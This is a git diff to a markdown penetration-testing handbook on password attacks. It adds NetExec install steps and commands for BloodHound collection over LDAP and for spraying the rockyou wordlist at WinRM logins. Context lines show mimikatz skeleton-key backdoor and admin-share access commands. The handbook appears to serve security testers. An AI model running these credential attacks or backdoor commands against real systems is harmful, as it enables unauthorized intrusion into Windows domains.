@@ -18,6 +18,7 @@
 - [LUKS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#LUKS)
 - [Medusa](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Medusa)
 - [mimikatz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#mimikatz)
+- [NetExec](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#NetExec)
 - [Patator](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Patator)
 - [PDFCrack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#PDFCrack)
 - [pypykatz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#pypykatz)
@@ -496,6 +497,33 @@ mimikatz # privilege::debug
 mimikatz # misc::skeleton
 C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
+
+## NetExec
+
+> https://github.com/Pennyw0rth/NetExec
+
+```c
+$ sudo apt-get install pipx git
+$ pipx ensurepath
+$ pipx install git+https://github.com/Pennyw0rth/NetExec
+```
+
+### Installation via Poetry
+
+```c
+$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
+$ git clone https://github.com/Pennyw0rth/NetExec
+$ cd NetExec
+$ poetry install
+$ poetry run NetExec
+```
+
+### Common Commands
+
+```c
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+$ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
 
 ## Patator
